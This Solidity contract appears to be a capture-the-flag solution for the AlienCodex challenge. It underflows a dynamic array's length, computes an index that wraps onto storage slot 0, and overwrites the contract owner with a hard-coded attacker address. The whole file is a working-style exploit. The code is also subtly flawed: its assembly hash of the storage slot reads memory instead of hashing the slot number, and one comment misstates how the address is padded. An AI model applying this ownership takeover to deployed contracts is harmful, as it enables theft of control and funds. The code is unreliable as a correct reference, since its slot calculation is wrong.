pragma solidity ^0.5.0;
import "../levels/AlienCodex.sol";

contract CodeStorageAttacker {
    AlienCodex public target;
    address public originalOwner = 0x5FbDB2315678afecb367f032d93F642f64180aa3;
    address public deployer = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;

    constructor(address _target) public {
        target = AlienCodex(_target);
    }

    function attack() public {
        // Make contact first
        target.makeContact();

        // Retract to set codex length to 0xFFFFFFFF... -> max uint256
        target.retract();

        // Calculate the index for codex that maps to storage slot 0 (owner address)
        uint256 baseSlot;
        assembly {
            baseSlot := keccak256(0x02, 32)
        }

        uint256 index = 0 - baseSlot;

        // Prepare attacker's address as right-padded bytes32
        bytes32 paddedAddress = 0x000000000000000000000000f39Fd6e51aad88F6F4ce6aB8827279cffFb92266;

        // Use this index to revise (which is the same as overwriting storage slot 0)
        target.revise(index, paddedAddress);
    }
}
